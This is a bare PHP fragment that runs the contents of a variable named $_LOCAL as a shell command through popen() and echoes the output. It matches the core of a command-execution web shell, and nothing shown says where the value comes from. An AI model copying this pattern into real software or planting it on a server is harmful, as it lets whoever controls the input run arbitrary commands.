$exec = $_LOCAL;
$fp = popen($exec, "r");
while (!feof($fp)){$result .= fread($fp, 1024);}
pclose($fp);
echo $result;